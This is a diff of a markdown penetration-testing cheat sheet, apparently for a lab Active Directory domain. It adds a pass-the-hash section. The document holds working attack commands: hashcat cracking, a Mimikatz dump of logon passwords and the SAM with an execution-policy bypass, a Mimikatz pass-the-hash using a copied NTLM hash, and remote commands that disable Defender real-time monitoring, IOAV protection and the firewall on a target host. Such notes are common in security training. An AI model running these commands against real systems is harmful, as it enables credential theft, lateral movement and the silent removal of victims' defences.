@@ -56,7 +56,7 @@ Copying the files to the current directory:
  hashcat -D 2 -m 1000 hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
  ```
  
- ### SAM and LSA w/ mimikatz
+### SAM and LSA w/ mimikatz
  
  ```powershell
  powershell -ep bypass
@@ -65,6 +65,31 @@ Copying the files to the current directory:
  
  Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords' "lsadump::sam" "exit"'
   ```
- Copy the NTLM of the users 😈
+Copy the NTLM of the users 😈
  
- ### PASS the HASH
+### Pass the Hash Attack w/ mimikatz
+
+
+ ```powershell
+ powershell -ep bypass
+ 
+ . .\invoke-mimikatz.ps1
+ 
+ Invoke-Mimikatz -Command '"sekurlsa::pth /user:student2 /domain:marvel /ntlm:<NTLM YOU COPIED> /run:powershell.exe"'
+  ```
+  
+Create a session variable and disable defences:
+  
+  ```powershell
+  
+  $sess = New-PSSession -ComputerName FILESHARE
+  
+  Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealTimeMonitoring $true} -session $sess
+  
+  
+  Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -session $sess
+  
+  
+  Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -session $sess
+  
+  ```
